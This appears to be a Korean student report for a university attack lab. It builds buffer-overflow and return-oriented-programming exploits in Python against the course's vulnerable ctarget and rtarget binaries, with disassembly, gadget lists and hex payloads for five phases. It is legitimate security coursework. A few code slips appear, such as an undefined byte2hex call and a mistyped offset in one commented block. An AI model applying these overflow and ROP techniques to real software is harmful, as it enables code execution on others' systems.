# CSED211 - Lab4 (attack) Report

**20220140 Taeyeon Kim**

[toc]

## Before

**Lecture에 나오는 AT&T Syntax가 아니라 로컬에서 GDB의 확장 플러그인인 GEF(GDB Enhanced Features)의 Intel Syntax를 사용하여 분석했기 때문에, 연산자의 이름이나 피연산자의 순서가 Lecture와 다를 수 있습니다.**

**`programming2.postech.ac.kr` 서버에서 Python을 사용하여 Exploit code를 돌렸으며, Exploit code를 만들 기 위해 로컬 환경 Python Pwntools의 `shellcraft.asm` 기능을 사용하였습니다.**

**ROP를 수행하기 위한 Gadget을 찾는데 `ROPgadget`이라는 프로그램을 사용하여 놓치는 가젯이 없는지 확인했습니다.**

## Pre-analysis

먼저, 해당 ELF가 64bit 환경에서 실행되기 때문에 **미리 `WORD_SIZE = 0x8`를 정의하였다.**

```assembly
gef➤  disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004016c0 <+0>:     sub    rsp,0x18
   0x00000000004016c4 <+4>:     mov    rdi,rsp
   0x00000000004016c7 <+7>:     call   0x4018fa <Gets>
   0x00000000004016cc <+12>:    mov    eax,0x1
   0x00000000004016d1 <+17>:    add    rsp,0x18
   0x00000000004016d5 <+21>:    ret
End of assembler dump.
```

`getbuf` 함수의 Stack size는 `0x18`으로, `leave`가 없기에 Stack frame pointer가 아닌 Return address만 고려해주어 Exploit code를 짤 수 있다.

또한, `ctarget`의 `getbuf`가 실행될 때 Breakpoint를 걸면 다음과 같은 레지스터 상황을 얻을 수 있다.

```text
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x55586000 --> 0x0 
RCX: 0x3a676e6972747320 (' string:')
RDX: 0x7ffff7dd6a00 --> 0x0 
RSI: 0x403038 --> 0x6c707865206f4e00 ('')
RDI: 0x0 
RBP: 0x55685fe8 --> 0x402d2d --> 0x3a6968003a697168 ('hqi:')
RSP: 0x55641160 --> 0x401848 (<test+14>:        mov    esi,eax)
RIP: 0x4016c0 (<getbuf>:        sub    rsp,0x18)
R8 : 0x0 
R9 : 0x0 
R10: 0x55640d30 --> 0x0 
R11: 0x7ffff7a9ca00 (<__memset_sse2>:   movd   xmm8,esi)
R12: 0x1 
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
```

`getbuf`의 buffer area에 Exploit code를 작성하고, 이 위치로 점프하기 위해 buffer의 address인 `rsp` 값을 추후에 사용하게 된다. **미리 `GETBUF_STACK_OFFSET = 0x18`, `GETBUF_RSP_ADDR = 0x55641148`를 정의하였다.**

```shell
$ cat cookie.txt
0x6eb933c2
```

`cookie` 값은 0x6eb933c2이다. **미리 `COOKIE = 0x6eb933c2`를 정의하였다.**



## Utility codes

### `p64(int) -> bytes`

```py
import struct
def p64(x: int) -> bytes:
    return struct.pack("<Q", x).ljust(8, b'\x00')
```

`p64`는 주어진 정수를 8byte Little endian으로 Packing하고, `\x00` 으로 패딩을 대어 8byte를 맞추는 함수이다.



### `byte2sphex(bytes) -> str`

```py
def byte2sphex(x: bytes) -> str:
    string = ""
    for ch in x:
        string += hex(ch)[2:].rjust(2, '0') + ' '
    return string
```

`byte2sphex`는 얻어진 `bytes` array를 `hex2raw`의 입력 포맷에 맞게 바꾸어 주는 함수이다. 



### ROP Gadgets - `find_gadget_addr(str) -> int`

ROP Gadget을 얻기 위해, 로컬에서 `rtarget`을 다음과 같이 실행하여 ROP gadget을 얻을 수 있었다.

```shell
$ ROPgadget --binary rtarget > 'Gadgets.txt'
$ cat Gadgets.txt
Gadgets information
============================================================
0x0000000000404088 : adc al, 0 ; add byte ptr [rax], al ; jl 0x404097 ; add byte ptr [rax], al ; nop ; jmp 0x404092
0x0000000000400d47 : adc al, 0 ; add byte ptr [rax], al ; jmp 0x400bf0
...(중략)...
0x0000000000401ae2 : xor byte ptr [rax], al ; jmp 0x401aec
0x0000000000401b9c : xor byte ptr [rax], al ; nop ; jmp 0x401ba7
0x0000000000400bd9 : xor eax, dword ptr [rcx] ; add byte ptr [rax], al ; add rsp, 8 ; ret

Unique gadgets found: 867
```

로컬에서 867개의 ROP gadget을 발견할 수 있었으며 (이 중 실제로 사용 가능한 것은 극히 일부일 것이다), 이 정보를 `(sha256(gadget), addr)` 형태로 저장한 데이터를 `programming2.postech.ac.kr`에서 사용할 수 있도록 하였다.

```text
2533e31ef6eee456596ae29f0249e2526bfcd493c2a021ad701db4451dddd32c 4210824
8edab5d544d6710073d63a0031d819b25e3e554607587a284365044d0ac34f22 4197703
c81f53951042554b495c1e01109e09f9c263f99f97385122e4606a06e69b530a 4210724
9a84012ec3011264515b66ceac872e0d7ca46e8eb3194f1676059634caefcf4f 4197378
...(후략)
```

```py
import hashlib

Gadgets = {}
with open("Gadgets_Dict.txt", "r") as f:
    G = f.read().splitlines()
    G = [dat.split() for dat in G]
    for hsh, addr in G:
        Gadgets[hsh] = int(addr)
        
def find_gadget_addr(x: str) -> int:
    return Gadgets.get(hashlib.sha256(x.encode('ascii')).hexdigest())

>>> find_gadget_addr("pop rsp ; ret")
4200404
```



## Phase 1

In `touch1` of `ctarget`:

```assembly
gef➤  disas touch1
Dump of assembler code for function touch1:
   0x00000000004016d6 <+0>:     sub    rsp,0x8
   0x00000000004016da <+4>:     mov    DWORD PTR [rip+0x202e18],0x1        # 0x6044fc <vlevel>
   0x00000000004016e4 <+14>:    mov    edi,0x402e3a
   0x00000000004016e9 <+19>:    call   0x400c50 <puts@plt>
   0x00000000004016ee <+24>:    mov    edi,0x1
   0x00000000004016f3 <+29>:    call   0x401ae9 <validate>
   0x00000000004016f8 <+34>:    mov    edi,0x0
   0x00000000004016fd <+39>:    call   0x400df0 <exit@plt>
End of assembler dump.
```

`touch1` 의 인자로 전달되는 것이 없으니, `getbuf`의 buffer를 overflow하여 Return address를 `touch1`로 맞춰 주면 된다. Exploit code는 다음과 같다.

```py
def phase_1():
    TOUCH_1_ADDR = 0x4016d6
    Ex = b''
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')	# Buffer filling
    Ex += p64(TOUCH_1_ADDR)						# Return address

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./ctarget")
```

전달되는 data의 hexadecimal value는 다음과 같다.

```text
4141414141414141	// 0x18 byte padding of buffer
4141414141414141
4141414141414141
d616400000000000	// Return Address : Address of touch_1
```



## Phase 2

In `touch2` of `ctarget`:

```assembly
gef➤  disas touch2
Dump of assembler code for function touch2:
   0x0000000000401702 <+0>:     sub    rsp,0x8
   0x0000000000401706 <+4>:     mov    esi,edi
   0x0000000000401708 <+6>:     mov    DWORD PTR [rip+0x202dea],0x2        # 0x6044fc <vlevel>
   0x0000000000401712 <+16>:    cmp    edi,DWORD PTR [rip+0x202dec]        # 0x604504 <cookie>
   0x0000000000401718 <+22>:    jne    0x401735 <touch2+51>
   0x000000000040171a <+24>:    mov    edi,0x402e60
   0x000000000040171f <+29>:    mov    eax,0x0
   0x0000000000401724 <+34>:    call   0x400c80 <printf@plt>
   0x0000000000401729 <+39>:    mov    edi,0x2
   0x000000000040172e <+44>:    call   0x401ae9 <validate>
   0x0000000000401733 <+49>:    jmp    0x40174e <touch2+76>
   0x0000000000401735 <+51>:    mov    edi,0x402e88
   0x000000000040173a <+56>:    mov    eax,0x0
   0x000000000040173f <+61>:    call   0x400c80 <printf@plt>
   0x0000000000401744 <+66>:    mov    edi,0x2
   0x0000000000401749 <+71>:    call   0x401b9b <fail>
   0x000000000040174e <+76>:    mov    edi,0x0
   0x0000000000401753 <+81>:    call   0x400df0 <exit@plt>
End of assembler dump.
```

`0x0000000000401712 <+16>:    cmp    edi,DWORD PTR [rip+0x202dec]        # 0x604504 <cookie>`에서 cookie를 비교한다.  `cookie`를 `edi`에 넣을 수 있는 코드가 필요하게 된다. 이후, `touch_2`의 주소를 stack에 넣고, 반환되는 과정까지 모두 작성하여 Exploit을 진행해야 한다. 따라서, 코드는 다음과 같아야 한다.

```assembly
mov rdi, [COOKIE]			// cookie 값을 rdi에 옮긴다.
push 0xdeadbeef <touch_2>	// 이후 stack에 touch_2의 주소를 삽입한다.
ret							// pop rip; jmp rip;를 통해 touch_2로 control flow를 바꾼다.
```

로컬 Pwntools의 `asm`을 사용하여 코드를 만들었다.

```py
>>> TOUCH_2_ADDR = 0x401702
>>> asm(rf"""mov rdi, {COOKIE}; push {TOUCH_2_ADDR}; ret;""", arch='amd64', os='linux')
b"\x48\xC7\xC7\xC2\x33\xB9\x6E\x68\x02\x17\x40\x00\xC3"
```

해당 Exploit code는 `getbuf` 함수의 buffer에 쓰이게 되며, 이를 opcode로 인식하고 점프시키기 위해 앞서 설명한 (buffer의 address) == `rsp of getbuf`으로 return address를 덮어야 한다. 이를 감안한 최종적인 Exploit code는 다음과 같다.

```py
def phase_2():
    TOUCH_2_ADDR = 0x401702
    
    """
    Ex = asm(
        rf'''
        mov rdi, {COOKIE}
        push {TOUCH_2_ADDR}
        ret
        ''',
        arch='amd64',
        os='linux'
    )
    """

    Ex = b"\x48\xC7\xC7\xC2\x33\xB9\x6E\x68\x02\x17\x40\x00\xC3"
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')
    Ex += p64(GETBUF_RSP_ADDR)

    print(byte2sphex(Ex))

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./ctarget")
```

전달되는 data의 hexadecimal value는 다음과 같다.

```text
48c7c7c233b96e68	// Exploit code with 0x18 byte padding
02174000c3414141	// -> mov rdi, COOKIE; push TOUCH_2_ADDR; ret;
4141414141414141	//
4811645500000000	// Return Address: Address of input buffer (0x55641148)
```

## Phase 3

In `touch3` of `ctarget`:

```assembly
gef➤  disas touch3
Dump of assembler code for function touch3:
   0x00000000004017d6 <+0>:     push   rbx
   0x00000000004017d7 <+1>:     mov    rbx,rdi
   0x00000000004017da <+4>:     mov    DWORD PTR [rip+0x202d18],0x3        # 0x6044fc <vlevel>
   0x00000000004017e4 <+14>:    mov    rsi,rdi
   0x00000000004017e7 <+17>:    mov    edi,DWORD PTR [rip+0x202d17]        # 0x604504 <cookie>
   0x00000000004017ed <+23>:    call   0x401758 <hexmatch>
   0x00000000004017f2 <+28>:    test   eax,eax
   0x00000000004017f4 <+30>:    je     0x401814 <touch3+62>
   0x00000000004017f6 <+32>:    mov    rsi,rbx
   0x00000000004017f9 <+35>:    mov    edi,0x402eb0
   0x00000000004017fe <+40>:    mov    eax,0x0
   0x0000000000401803 <+45>:    call   0x400c80 <printf@plt>
   0x0000000000401808 <+50>:    mov    edi,0x3
   0x000000000040180d <+55>:    call   0x401ae9 <validate>
   0x0000000000401812 <+60>:    jmp    0x401830 <touch3+90>
   0x0000000000401814 <+62>:    mov    rsi,rbx
   0x0000000000401817 <+65>:    mov    edi,0x402ed8
   0x000000000040181c <+70>:    mov    eax,0x0
   0x0000000000401821 <+75>:    call   0x400c80 <printf@plt>
   0x0000000000401826 <+80>:    mov    edi,0x3
   0x000000000040182b <+85>:    call   0x401b9b <fail>
   0x0000000000401830 <+90>:    mov    edi,0x0
   0x0000000000401835 <+95>:    call   0x400df0 <exit@plt>
End of assembler dump.
```

`hexmatch`를 호출하는 것을 보아, `cookie`값을 string으로 나타낸 결과가 맞는지 확인한다. 따라서, 필요한 요소는 다음과 같다.

* 저장할 `cookie`의 위치
* `cookie`의 위치를 옮길 code
* `touch_3`으로 뛸 code

이 3개를 조합하여서 Exploit을 수행한다. `touch_2`를 호출하던 방식과 마찬가지로, buffer에 exploit code를 작성하고 0x18byte의 padding을 댄다.

그 이후 8byte에 Exploit code의 주소를 삽입하고, 마지막 8byte에 `cookie`의 값을 덮어 쓴 후 이 위치의 offset을 계산하여 buffer에 작성할 exploit code에 반영한다.



최종적으로 다음과 같은 형태로 Exploit script를 작성하여 exploit code를 만들고, `touch_3`을 실행할 수 있다.

```py
def phase_3():
    TOUCH_3_ADDR = 0x4017d6
    
    """
    Ex = asm(
        rf'''
        mov rdi, {GETBUF_RSP_ADDR + GETBUF_STACK_OFFSET + WORD_SIZE}
        push {TOUCH_3_ADDR}
        ret
        ''',
        arch='amd64',
        os='linux'
    )
    """

    Ex = b"\x48\xC7\xC7\x68\x11\x64\x55\x68\xD6\x17\x40\x00\xC3"
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')
    Ex += p64(GETBUF_RSP_ADDR)
    Ex += cookie_to_hex(COOKIE)

    print(byte2hex(Ex))

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./ctarget")
```

전달되는 data의 hexadecimal value는 다음과 같다.

```text
48c7c76811645568	// Exploit code with 0x18 byte padding
d6174000c3414141	// -> mov rdi, (GETBUF_RSP_ADDR + GETBUF_STACK_OFFSET + WORD_SIZE); push TOUCH_3_ADDR; ret;
4141414141414141	//
4811645500000000	// Return Address: Address of input buffer (0x55641148)
3665623933336332	// Desired string (Cookie value): 0x3665623933336332 "6eb933c2"
```





## Phase 4

In `touch2` of `rtarget`:

```assembly
gef➤  disas touch2
Dump of assembler code for function touch2:
   0x0000000000401702 <+0>:     sub    rsp,0x8
   0x0000000000401706 <+4>:     mov    esi,edi
   0x0000000000401708 <+6>:     mov    DWORD PTR [rip+0x203dea],0x2        # 0x6054fc <vlevel>
   0x0000000000401712 <+16>:    cmp    edi,DWORD PTR [rip+0x203dec]        # 0x605504 <cookie>
   0x0000000000401718 <+22>:    jne    0x401735 <touch2+51>
   0x000000000040171a <+24>:    mov    edi,0x402f90
   0x000000000040171f <+29>:    mov    eax,0x0
   0x0000000000401724 <+34>:    call   0x400c80 <printf@plt>
   0x0000000000401729 <+39>:    mov    edi,0x2
   0x000000000040172e <+44>:    call   0x401c19 <validate>
   0x0000000000401733 <+49>:    jmp    0x40174e <touch2+76>
   0x0000000000401735 <+51>:    mov    edi,0x402fb8
   0x000000000040173a <+56>:    mov    eax,0x0
   0x000000000040173f <+61>:    call   0x400c80 <printf@plt>
   0x0000000000401744 <+66>:    mov    edi,0x2
   0x0000000000401749 <+71>:    call   0x401ccb <fail>
   0x000000000040174e <+76>:    mov    edi,0x0
   0x0000000000401753 <+81>:    call   0x400df0 <exit@plt>
End of assembler dump.
```

`   0x0000000000401712 <+16>:    cmp    edi,DWORD PTR [rip+0x203dec]        # 0x605504 <cookie>`를 통과하기 위해, `edi`에 `cookie`를 옮기는 코드가 필요하다.

필요한 조건은 다음과 같다.

* Buffer 채우기 (0x18 bytes)
* `rdi`에 `cookie`를 `pop`하기
* 이후 `touch_2`의 address로 `ret`하기

>*따라서, `pop rdi ; ret` gadget을 찾아 `cookie`를 `rdi`로 `pop`하고, `TOUCH_2_ADDR`으로 `ret`하는 시나리오를 구상하였다.*
>
>*다음과 같이 Exploit Code를 구성하였고, 실행해서 서버 상에서 유효한 정답임을 보였으나, Scoreboard에서 invalid하다는 결과를 얻었다.*
>
>```py
>Ex = b''
>Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')
>
>Ex += p64(find_gadget_addr("pop rdi ; ret"))
>Ex += p64(COOKIE)
>Ex += p64(TOUCH_2_ADDR)
>```

이 때문에 다른 접근을 시도하였으며, `rdi`에서 directly `pop`하는 것이 아닌 다른 register를 사용하여 `pop`한 후, `mov` instruction을 이용해 `rdi`로 옮기는 시나리오를 구상하였으며, 필요 조건은 다음과 같다.

* Buffer 채우기 (0x18 bytes)
* `rax`에 `cookie`를 `pop`하기
* `rax`를 `rdi`로 옮기기
* 이후 `touch_2`의 address로 `ret`하기

최종적으로 필요한 Code는 다음과 같다.

```py
def phase_4():
    TOUCH_2_ADDR = 0x401702

    Ex = b''
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')

    Ex += p64(find_gadget_addr("pop rax ; ret"))
    Ex += p64(COOKIE)
    Ex += p64(find_gadget_addr("mov rdi, rax ; ret"))
    Ex += p64(TOUCH_2_ADDR)

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./rtarget")
```

전달되는 data의 hexadecimal value는 다음과 같다.

```text
4141414141414141	// 0x18 byte padding of buffer
4141414141414141	//
4141414141414141	//
8318400000000000	// Return Address: Gadget Address of `pop rax ; ret`
c233b96e00000000	// Cookie value (to be popped to rax -> moved to rdi)
9718400000000000	// Return Address: Gadget Address of `mov rdi, rax ; ret`
0217400000000000	// Return Address: Address of touch_2
```



## Phase 5

In `touch3` of `rtarget`:

```assembly
gef➤  disas touch3
Dump of assembler code for function touch3:
   0x00000000004017d6 <+0>:     push   rbx
   0x00000000004017d7 <+1>:     mov    rbx,rdi
   0x00000000004017da <+4>:     mov    DWORD PTR [rip+0x203d18],0x3        # 0x6054fc <vlevel>
   0x00000000004017e4 <+14>:    mov    rsi,rdi
   0x00000000004017e7 <+17>:    mov    edi,DWORD PTR [rip+0x203d17]        # 0x605504 <cookie>
   0x00000000004017ed <+23>:    call   0x401758 <hexmatch>
   0x00000000004017f2 <+28>:    test   eax,eax
   0x00000000004017f4 <+30>:    je     0x401814 <touch3+62>
   0x00000000004017f6 <+32>:    mov    rsi,rbx
   0x00000000004017f9 <+35>:    mov    edi,0x402fe0
   0x00000000004017fe <+40>:    mov    eax,0x0
   0x0000000000401803 <+45>:    call   0x400c80 <printf@plt>
   0x0000000000401808 <+50>:    mov    edi,0x3
   0x000000000040180d <+55>:    call   0x401c19 <validate>
   0x0000000000401812 <+60>:    jmp    0x401830 <touch3+90>
   0x0000000000401814 <+62>:    mov    rsi,rbx
   0x0000000000401817 <+65>:    mov    edi,0x403008
   0x000000000040181c <+70>:    mov    eax,0x0
   0x0000000000401821 <+75>:    call   0x400c80 <printf@plt>
   0x0000000000401826 <+80>:    mov    edi,0x3
   0x000000000040182b <+85>:    call   0x401ccb <fail>
   0x0000000000401830 <+90>:    mov    edi,0x0
   0x0000000000401835 <+95>:    call   0x400df0 <exit@plt>
End of assembler dump.
```

`touch_3`은 `rdi`에 (stringify된 cookle)의 address를 전달하는 것을 목표로 한다.

따라서 다음과 같이 수행해야 한다.

* Buffer 채우기 (0x18 bytes)
* cookie address setting하기 - `pop rdi ; ret`계열 사용
* `touch_3`의 address로 `ret`하기

문제는 cookie address의 setting이다. buffer의 시작 주소 (`GETBUF_RSP_ADDR`) 만을 안 상태에서 해당 값을 맞추기 위해, offset을 계산하는 함수가 절대적으로 필요하게 된다. 다행히 다음과 같은 함수를 발견했다.

```assembly
gef➤  info functions
All defined functions:
...
Non-debugging symbols:
0x0000000000400bc8  _init
...
0x000000000040189b  mid_farm
0x00000000004018a1  add_xy
0x00000000004018a6  getval_332
...
0x0000000000402bb0  __libc_csu_init
0x0000000000402c20  __libc_csu_fini
0x0000000000402c24  _fini
```

`add_xy`를 살펴보면 다음과 같다.

```assembly
gef➤  disas add_xy
Dump of assembler code for function add_xy:
   0x00000000004018a1 <+0>:     lea    rax,[rdi+rsi*1]
   0x00000000004018a5 <+4>:     ret
End of assembler dump.
```

간단하게 `rdi + rsi`의 값을 반환하는 함수이다. 이를 이용해 Offset을 계산할 수 있으며, 다음과 같이 수행해야 한다.

* Buffer 채우기 (0x18 bytes)
* cookie address setting하기
  * `add_xy` 함수 호출
    * `rdi`에는 현재 `rsp`가 들어가야 하고,
    * `rsi`에는 `rsp`로부터 오프셋이 들어가야 한다.  - **`rsp`의 기준은 `rdi`가 setting 되었을 때의 stack에서의 Offset을 계산해야 한다**
  * Return value `rdi`를 다시 인자로 setting하고  `ret` 하기
* `touch_3`의 address로 `ret`하기

이를 위한 Gadget를 찾아 보면, 직접적으로 `mov rdi, rsp ; ret`하는 Gadget이 없었기에, 한 번 돌려서 `mov rax, rsp ; ret`과 `mov rdi, rax ; ret`을 연속적으로 사용해 `rdi`를 setting해야 한다.

그럼 다음과 같은 Exploit code의 outline을 짤 수 있다.

```python
Ex = b''
Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')			# 0x18 byte padding of buffer
Ex += p64(find_gadget_addr("mov rax, rsp ; ret"))	# Gadget for setting `rdi` to current `rsp` 
Ex += p64(find_gadget_addr("mov rdi, rax ; ret"))	#
Ex += p64(find_gadget_addr("pop rsi ; ret"))		# Gadget for setting `rsi` value
# Ex += p64() 									   # Size amount of OFFSET!
Ex += p64(ADD_XY_ADDR)								# Return Address to call `add_xy`
Ex += p64(find_gadget_addr("mov rdi, rax ; ret"))	# Gadget for setting `rdi` to return value of `add_xy`
Ex += p64(TOUCH_3_ADDR)								# Return Address to call `touch_3`
Ex += cookie_to_hex(COOKIE)							# Desired string (Cookie value)
```

`mov rdi, rax`를 수행하면 Stack에 덮어쓴 `WORD_SIZE` 단위 address들이 6개 지난 후에 stringify된 `cookie`의 값을 찾을 수 있다. 따라서, Offset size는 `WORD_SIZE * 6 == 0x30 `이 되어야 한다.

최종적으로 필요한 Code는 다음과 같다.

```py
def phase_5():
    TOUCH_3_ADDR = 0x4017D6
    ADD_XY_ADDR = 0x4018A1
    
    Ex = b''
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')
    Ex += p64(find_gadget_addr("mov rax, rsp ; ret"))
    Ex += p64(find_gadget_addr("mov rdi, rax ; ret"))
    Ex += p64(find_gadget_addr("pop rsi ; ret"))
    Ex += p64(WORD_SIZE * 6)
    Ex += p64(ADD_XY_ADDR)
    Ex += p64(find_gadget_addr("mov rdi, rax ; ret"))
    Ex += p64(TOUCH_3_ADDR)
    Ex += cookie_to_hex(COOKIE)

    print(byte2hex(Ex))

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./rtarget")
```

전달되는 data의 hexadecimal value는 다음과 같다.

```text
4141414141414141	// 0x18 byte padding of buffer
4141414141414141	//
4141414141414141	//
2c19400000000000	// Return Address: Gadget address of `mov rax, rsp ; ret`
9718400000000000	// Return Address: Gadget address of `mov rdi, rax ; ret`
a112400000000000	// Return Address: Gadget address of `pop rsi ; ret`
3000000000000000	// Offset value (to be popped to rsi)
a118400000000000	// Return Address: Address of `add_xy`
9718400000000000	// Return Address: Gadget address of `mov rdi, rax ; ret`
d617400000000000	// Return Address: Address of `touch_3`
3665623933336332	// Desired string (Cookie value): 0x3665623933336332 "6eb933c2"
```

---

## Final Exploit Codes

### `Excode-Ctarget.py`

```py
import struct
import os

WORD_SIZE = 8

COOKIE = 0x6eb933c2

GETBUF_STACK_OFFSET = 0x18
GETBUF_RSP_ADDR = 0x55641148

def p64(x: int) -> bytes:
    return struct.pack("<Q", x).ljust(WORD_SIZE, b'\x00')

def byte2sphex(x: bytes) -> str:
    string = ""
    for ch in x:
        string += hex(ch)[2:].rjust(2, '0') + ' '
    return string

def cookie_to_hex(x: int) -> bytes:
    return bytes(hex(x)[2:], encoding='ascii')

### Stage 1
def phase_1():
    TOUCH_1_ADDR = 0x4016d6
    Ex = b''
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')
    Ex += p64(TOUCH_1_ADDR)

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./ctarget")

### Stage 2
def phase_2():
    TOUCH_2_ADDR = 0x401702
    
    """
    Ex = asm(
        rf'''
        mov rdi, {COOKIE}
        push {TOUCH_2_ADDR}
        ret
        ''',
        arch='amd64',
        os='linux'
    )
    """

    Ex = b"\x48\xC7\xC7\xC2\x33\xB9\x6E\x68\x02\x17\x40\x00\xC3"
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')
    Ex += p64(GETBUF_RSP_ADDR)

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./ctarget")

### Stage 3
def phase_3():
    TOUCH_3_ADDR = 0x4017d6
    
    """
    Ex = asm(
        rf'''
        mov rdi, {GETBUF_RSP_ADDR + GETBUF_STACK_OFFSET + GETBUF_RSP_ADDR}
        push {TOUCH_3_ADDR}
        ret
        ''',
        arch='amd64',
        os='linux'
    )
    """

    Ex = b"\x48\xC7\xC7\x68\x11\x64\x55\x68\xD6\x17\x40\x00\xC3"
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')
    Ex += p64(GETBUF_RSP_ADDR)
    Ex += cookie_to_hex(COOKIE)

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./ctarget")

if __name__ == "__main__":
	phase_1()
	phase_2()
	phase_3()
```

### `Excode-Rtarget.py`

```py
import struct
import hashlib
import os

WORD_SIZE = 8

COOKIE = 0x6eb933c2

GETBUF_STACK_OFFSET = 0x18

Gadgets = {}
with open("Gadgets_Dict.txt", "r") as f:
    G = f.read().splitlines()
    G = [dat.split() for dat in G]
    for hsh, addr in G:
        Gadgets[hsh] = int(addr)


def p64(x: int) -> bytes:
    return struct.pack("<Q", x).ljust(WORD_SIZE, b'\x00')

def byte2sphex(x: bytes) -> str:
    string = ""
    for ch in x:
        string += hex(ch)[2:].rjust(2, '0') + ' '
    return string

def cookie_to_hex(x: int) -> bytes:
    return bytes(hex(x)[2:], encoding='ascii')

def find_gadget_addr(x: str) -> int:
    return Gadgets.get(hashlib.sha256(x.encode('ascii')).hexdigest())

### Stage 4
def phase_4():
    TOUCH_2_ADDR = 0x401702

    Ex = b''
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')

    Ex += p64(find_gadget_addr("pop rax ; ret"))
    Ex += p64(COOKIE)
    Ex += p64(find_gadget_addr("mov rdi, rax ; ret"))
    Ex += p64(TOUCH_2_ADDR)

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./rtarget")

### Stage 5
def phase_5():
    TOUCH_3_ADDR = 0x4017D6
    ADD_XY_ADDR = 0x4018A1
    
    Ex = b''
    Ex = Ex.ljust(GETBUF_STACK_OFFSET, b'A')
    Ex += p64(find_gadget_addr("mov rax, rsp ; ret"))
    Ex += p64(find_gadget_addr("mov rdi, rax ; ret"))
    Ex += p64(find_gadget_addr("pop rsi ; ret"))
    Ex += p64(0x30)
    Ex += p64(ADD_XY_ADDR)
    Ex += p64(find_gadget_addr("mov rdi, rax ; ret"))
    Ex += p64(TOUCH_3_ADDR)
    Ex += cookie_to_hex(COOKIE)

    with open("exploit.txt", 'w') as f:
        f.write(byte2sphex(Ex))

    os.system("./hex2raw < exploit.txt | ./rtarget")

if __name__ == "__main__":
	phase_4()
	phase_5()
```

### `GadgetData.py` - *Executed on local environment*

```py
import os
import hashlib

os.system("ROPgadget --binary rtarget > 'Gadgets.txt'")

with open("Gadgets.txt", "r") as g:
    gadget = g.read().splitlines()[2:-2]
    gadget = [gad.split(":") for gad in gadget]

    with open("Gadgets_Dict.txt", "w") as f:
        for addr, code in gadget:
            f.write(
                f"{hashlib.sha256(code.strip().encode('ascii')).hexdigest()} {int(addr.strip(), 16)}\n"
            )

```

### `Gadgets.txt`

```text
2533e31ef6eee456596ae29f0249e2526bfcd493c2a021ad701db4451dddd32c 4210824
8edab5d544d6710073d63a0031d819b25e3e554607587a284365044d0ac34f22 4197703
c81f53951042554b495c1e01109e09f9c263f99f97385122e4606a06e69b530a 4210724
9a84012ec3011264515b66ceac872e0d7ca46e8eb3194f1676059634caefcf4f 4197378
... (중략) ...
4c4f5dd6bd16977612c8b7e2d5b2911e64719361b4afe6b1ecc76ada2e957297 4201186
b68f40de044d0b7b23baf49932cd1658e9f14933977a40fe138314121b3432df 4201372
b70f42b4c8a6c03cab92f52f27aaea6b5f1cd761cf81d40c6c6f990bd864fe27 4197337
```

